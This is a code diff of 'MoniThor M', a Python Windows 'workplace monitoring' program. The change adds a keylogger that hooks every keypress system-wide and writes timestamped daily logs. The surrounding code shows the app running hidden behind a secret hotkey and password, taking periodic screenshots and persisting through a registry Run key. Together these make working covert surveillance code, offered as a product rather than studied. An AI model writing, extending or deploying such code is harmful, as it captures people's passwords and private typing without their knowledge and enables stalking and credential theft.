@@ -1,13 +1,14 @@
 import os
 import time
 import threading
-from datetime import datetime
+from datetime import datetime, date
 import customtkinter as ctk
 from tkinter import filedialog, messagebox
 import pyautogui
 import keyboard
 import sys
 import winreg as reg
+from collections import defaultdict
 
 # --- CONFIGURACIÓN DE SEGURIDAD ---
 CONTRASENA_ACCESO = "6525"  
@@ -17,7 +18,7 @@ COMBINACION_TECLAS = "ctrl+alt+m"
 SERIALES_VALIDOS = [
     "7xKqW2", "M9bVf1", "z4RnP8", "tG7mK5", "X2vYh9", "L6wBf3", "p8N1vG", "k4XmW9", "Z3vRj5", "H8fLq2",
     "c1M9xV", "F7nTz4", "r2G6hK", "W9vPj3", "b5XmN1", "Y8kTz4", "v3RfG9", "h6M1xK", "P7vNq2", "z4XmW8",
-    "G9fTj1", "c3KbV5", "R8vNq2", "771077", "V9hTj4", "k2BmN6", "Z8fLq3", "x1M5vG", "H7nTz2", "r4KbV9",
+    "G9fTj1", "c3KbV5", "R8vNq2", "m1XfK7", "V9hTj4", "k2BmN6", "Z8fLq3", "x1M5vG", "H7nTz2", "r4KbV9",
     "W6vPj1", "b3XmN8", "Y9kTz5", "v2RfG4", "h7M1xK", "P8vNq3", "z5XmW9", "G1fTj6", "c4KbV2", "R9vNq5",
     "m2XfK8", "V1hTj7", "k3BmN4", "Z9fLq5", "x2M6vG", "H8nTz5", "r5KbV1", "W7vPj3", "b4XmN9", "Y1kTz6"
 ]
@@ -26,9 +27,15 @@ class MonitorApp:
     def __init__(self):
         self.monitoreando = False
         self.carpeta_destino = os.path.join(os.path.expanduser("~"), "Desktop", "Capturas")
+        self.carpeta_logs = os.path.join(os.path.expanduser("~"), "Desktop", "Logs_Teclado")
         self.intervalo_segundos = 10
         self.hilo_captura = None
         self.ventana_login = None  
+        self.keylogger_activo = False
+        self.buffer_teclas = []
+        self.hilo_keylogger = None
+        self.teclas_presionadas = 0
+        self.reporte_actual = None
         
         self.tiempos_map = {
             "3 segundos": 3, "5 segundos": 5, "10 segundos": 10, "15 segundos": 15,
@@ -40,7 +47,7 @@ class MonitorApp:
         ctk.set_appearance_mode("dark")
         self.root = ctk.CTk()
         self.root.title("MoniThor M - Panel de Control")
-        self.root.geometry("520x460")
+        self.root.geometry("520x520")
         self.root.resizable(False, False)
         
         self.crear_interfaz_pestanas()
@@ -50,7 +57,6 @@ class MonitorApp:
         if not self.verificar_activacion_local():
             self.pedir_serial_activacion()
         else:
-            # Si ya está activado anteriormente, arranca oculto normalmente
             keyboard.add_hotkey(COMBINACION_TECLAS, self.mostrar_ventana_autenticacion)
             self.root.mainloop()
 
@@ -85,7 +91,6 @@ class MonitorApp:
         self.ventana_serial.resizable(False, False)
         self.ventana_serial.attributes("-topmost", True)
         
-        # Evitar que cierren la ventana desde la X sin activar
         self.ventana_serial.protocol("WM_DELETE_WINDOW", lambda: sys.exit())
 
         lbl_info = ctk.CTkLabel(self.ventana_serial, text="MoniThor M - Licencia Requerida", font=("Arial", 16, "bold"))
@@ -110,8 +115,6 @@ class MonitorApp:
             if self.guardar_activacion_local():
                 messagebox.showinfo("Éxito", "Software activado correctamente de forma permanente.")
                 self.ventana_serial.destroy()
-                
-                # Habilitar el atajo de teclado para el uso normal del programa ahora que está validado
                 keyboard.add_hotkey(COMBINACION_TECLAS, self.mostrar_ventana_autenticacion)
             else:
                 sys.exit()
@@ -120,10 +123,11 @@ class MonitorApp:
             self.ventana_serial.attributes("-topmost", True)
 
     def crear_interfaz_pestanas(self):
-        self.tabview = ctk.CTkTabview(self.root, width=480, height=380)
+        self.tabview = ctk.CTkTabview(self.root, width=480, height=440)
         self.tabview.pack(pady=10, padx=10)
         
         self.tabview.add("Monitoreo")
+        self.tabview.add("Keylogger")
         self.tabview.add("Configuración")
         self.tabview.add("Acerca de...")
 
@@ -140,7 +144,26 @@ class MonitorApp:
         btn_ocultar = ctk.CTkButton(self.tabview.tab("Monitoreo"), text="Ocultar (Segundo Plano)", fg_color="gray", command=self.ocultar_ventana)
         btn_ocultar.pack(pady=10)
 
-        # --- PESTAÑA 2: CONFIGURACIÓN ---
+        # --- PESTAÑA 2: KEYLOGGER ---
+        lbl_titulo_key = ctk.CTkLabel(self.tabview.tab("Keylogger"), text="Registro de Actividad de Teclado", font=("Arial", 18, "bold"))
+        lbl_titulo_key.pack(pady=15)
+
+        self.lbl_estado_key = ctk.CTkLabel(self.tabview.tab("Keylogger"), text="KEYLOGGER: APAGADO", text_color="red", font=("Arial", 16, "bold"))
+        self.lbl_estado_key.pack(pady=10)
+
+        self.lbl_contador = ctk.CTkLabel(self.tabview.tab("Keylogger"), text="Teclas registradas hoy: 0", font=("Arial", 12))
+        self.lbl_contador.pack(pady=5)
+
+        self.btn_keylogger = ctk.CTkButton(self.tabview.tab("Keylogger"), text="Iniciar Keylogger", fg_color="blue", hover_color="darkblue", height=40, font=("Arial", 14, "bold"), command=self.alternar_keylogger)
+        self.btn_keylogger.pack(pady=15, fill="x", padx=40)
+
+        btn_reporte = ctk.CTkButton(self.tabview.tab("Keylogger"), text="Ver Reporte de Hoy", fg_color="purple", hover_color="darkmagenta", height=35, font=("Arial", 12), command=self.ver_reporte_hoy)
+        btn_reporte.pack(pady=10)
+
+        btn_abrir_logs = ctk.CTkButton(self.tabview.tab("Keylogger"), text="Abrir Carpeta de Logs", fg_color="gray", command=self.abrir_carpeta_logs)
+        btn_abrir_logs.pack(pady=10)
+
+        # --- PESTAÑA 3: CONFIGURACIÓN ---
         lbl_tiempo = ctk.CTkLabel(self.tabview.tab("Configuración"), text="Intervalo de capturas de pantalla:", font=("Arial", 13, "bold"))
         lbl_tiempo.pack(anchor="w", padx=20, pady=(10, 2))
         
@@ -165,7 +188,7 @@ class MonitorApp:
         self.check_inicio.pack(pady=20)
         self.check_inicio.configure(command=self.configurar_inicio_automatico)
 
-        # --- PESTAÑA 3: ACERCA DE... ---
+        # --- PESTAÑA 4: ACERCA DE... ---
         frame_creditos = ctk.CTkFrame(self.tabview.tab("Acerca de..."))
         frame_creditos.pack(fill="both", expand=True, padx=15, pady=15)
 
@@ -175,7 +198,7 @@ class MonitorApp:
             f"Programa: MoniThor M\n"
             f"Descripción: Software de monitoreo laboral en Python que realiza capturas de pantalla automáticas cada cierto tiempo.\n\n"
             f"Creador: Attack7710 - Desarrollador\n"
-            f"Versión: V1.0\n"
+            f"Versión: V1.1\n"
             f"Ubicación: Bolivia\n"
             f"Contacto: +591 69856525\n"
             f"Fecha: {fecha_hoy}"
@@ -185,6 +208,174 @@ class MonitorApp:
         lbl_info.pack(pady=15, padx=15, anchor="w")
 
         self.root.protocol("WM_DELETE_WINDOW", self.ocultar_ventana)
+
+    # ==================== MÉTODOS DEL KEYLOGGER ====================
+
+    def alternar_keylogger(self):
+        if not self.keylogger_activo:
+            # Crear carpeta de logs si no existe
+            if not os.path.exists(self.carpeta_logs):
+                try:
+                    os.makedirs(self.carpeta_logs)
+                except Exception as e:
+                    messagebox.showerror("Error", f"No se pudo crear la carpeta de logs: {e}")
+                    return
+
+            self.keylogger_activo = True
+            self.teclas_presionadas = 0
+            self.buffer_teclas = []
+            self.reporte_actual = self._obtener_ruta_reporte()
+            
+            self.lbl_estado_key.configure(text="KEYLOGGER: ACTIVO", text_color="green")
+            self.btn_keylogger.configure(text="Detener Keylogger", fg_color="red", hover_color="darkred")
+            
+            # Iniciar el hilo del keylogger
+            self.hilo_keylogger = threading.Thread(target=self._bucle_keylogger, daemon=True)
+            self.hilo_keylogger.start()
+            
+            # Escribir encabezado del reporte diario
+            self._escribir_encabezado_reporte()
+            
+        else:
+            self.keylogger_activo = False
+            self.lbl_estado_key.configure(text="KEYLOGGER: APAGADO", text_color="red")
+            self.btn_keylogger.configure(text="Iniciar Keylogger", fg_color="blue", hover_color="darkblue")
+            
+            # Guardar lo que quede en el buffer
+            self._guardar_buffer()
+
+    def _obtener_ruta_reporte(self):
+        fecha = date.today().strftime("%Y-%m-%d")
+        return os.path.join(self.carpeta_logs, f"Reporte_Teclado_{fecha}.txt")
+
+    def _escribir_encabezado_reporte(self):
+        encabezado = (
+            f"{'='*60}\n"
+            f"  MONITHOR M - REPORTE DIARIO DE ACTIVIDAD DE TECLADO\n"
+            f"  Fecha: {date.today().strftime('%d/%m/%Y')}\n"
+            f"  Inicio de registro: {datetime.now().strftime('%H:%M:%S')}\n"
+            f"{'='*60}\n\n"
+        )
+        with open(self.reporte_actual, 'a', encoding='utf-8') as f:
+            f.write(encabezado)
+
+    def _procesar_tecla(self, evento):
+        try:
+            nombre_tecla = evento.name
+            
+            # Mapeo de teclas especiales para legibilidad
+            teclas_especiales = {
+                'space': ' ',
+                'enter': '\n[ENTER]\n',
+                'tab': '\t',
+                'backspace': '[BORRAR]',
+                'delete': '[SUPR]',
+                'shift': '[SHIFT]',
+                'ctrl': '[CTRL]',
+                'alt': '[ALT]',
+                'caps lock': '[BLOQ_MAYUS]',
+                'esc': '[ESC]',
+                'up': '[↑]',
+                'down': '[↓]',
+                'left': '[←]',
+                'right': '[→]',
+                'print screen': '[PANTALLA]',
+                'num lock': '[NUM_LOCK]',
+                'scroll lock': '[SCROLL_LOCK]',
+                'pause': '[PAUSA]',
+                'insert': '[INSERT]',
+                'home': '[INICIO]',
+                'end': '[FIN]',
+                'page up': '[RE_PAG]',
+                'page down': '[AV_PAG]',
+            }
+            
+            tecla_final = teclas_especiales.get(nombre_tecla.lower(), nombre_tecla)
+            
+            # Registrar con timestamp
+            timestamp = datetime.now().strftime("%H:%M:%S")
+            
+            # Acumular en buffer (cada 20 teclas o cada 30 segundos se guarda)
+            self.buffer_teclas.append(f"[{timestamp}] {tecla_final}")
+            self.teclas_presionadas += 1
+            
+            # Actualizar contador en la interfaz
+            self.lbl_contador.configure(text=f"Teclas registradas hoy: {self.teclas_presionadas}")
+            
+            # Guardar buffer cuando se acumulen 20 teclas
+            if len(self.buffer_teclas) >= 20:
+                self._guardar_buffer()
+                
+        except Exception:
+            pass
+
+    def _guardar_buffer(self):
+        if not self.buffer_teclas:
+            return
+            
+        try:
+            with open(self.reporte_actual, 'a', encoding='utf-8') as f:
+                for entrada in self.buffer_teclas:
+                    f.write(entrada + '\n')
+            self.buffer_teclas = []
+        except Exception:
+            pass
+
+    def _bucle_keylogger(self):
+        # Registrar el hook de teclado
+        keyboard.on_press(self._procesar_tecla)
+        
+        ultimo_flush = time.time()
+        
+        while self.keylogger_activo:
+            time.sleep(1)
+            # Guardar buffer cada 30 segundos aunque no se llene
+            if time.time() - ultimo_flush >= 30:
+                self._guardar_buffer()
+                ultimo_flush = time.time()
+                
+            # Verificar si cambió el día (nuevo reporte)
+            nueva_ruta = self._obtener_ruta_reporte()
+            if nueva_ruta != self.reporte_actual:
+                self._guardar_buffer()  # Guardar lo pendiente del día anterior
+                self.reporte_actual = nueva_ruta
+                self._escribir_encabezado_reporte()
+                self.teclas_presionadas = 0
+                self.lbl_contador.configure(text="Teclas registradas hoy: 0")
+        
+        # Al detener, quitar el hook
+        keyboard.unhook_all()
+
+    def ver_reporte_hoy(self):
+        ruta_hoy = self._obtener_ruta_reporte()
+        if os.path.exists(ruta_hoy):
+            try:
+                with open(ruta_hoy, 'r', encoding='utf-8') as f:
+                    contenido = f.read()
+                
+                # Ventana para mostrar el reporte
+                ventana_reporte = ctk.CTkToplevel(self.root)
+                ventana_reporte.title(f"Reporte del Día - {date.today().strftime('%d/%m/%Y')}")
+                ventana_reporte.geometry("600x500")
+                ventana_reporte.resizable(True, True)
+                
+                texto = ctk.CTkTextbox(ventana_reporte, width=580, height=450, font=("Consolas", 11))
+                texto.pack(pady=10, padx=10, fill="both", expand=True)
+                texto.insert("1.0", contenido)
+                texto.configure(state="disabled")
+                
+            except Exception as e:
+                messagebox.showerror("Error", f"No se pudo leer el reporte: {e}")
+        else:
+            messagebox.showinfo("Sin datos", "No hay registro de actividad para el día de hoy.")
+
+    def abrir_carpeta_logs(self):
+        if os.path.exists(self.carpeta_logs):
+            os.startfile(self.carpeta_logs)
+        else:
+            messagebox.showinfo("Sin logs", "La carpeta de logs aún no existe. Inicia el keylogger primero.")
+
+    # ==================== MÉTODOS EXISTENTES ====================
 
     def mostrar_ventana_autenticacion(self):
         if self.root.winfo_viewable() or (self.ventana_login and self.ventana_login.winfo_exists()):
@@ -264,7 +455,6 @@ class MonitorApp:
         try:
             clave = reg.OpenKey(reg.HKEY_CURRENT_USER, clave_ruta, 0, reg.KEY_SET_VALUE)
             if self.check_inicio.get() == 1:
-                # Comprobar si se ejecuta como .exe o .py para escribir la ruta correcta de arranque
                 if ruta_script.endswith('.exe'):
                     reg.SetValueEx(clave, nombre_app, 0, reg.REG_SZ, f'"{ruta_script}"')
                 else:
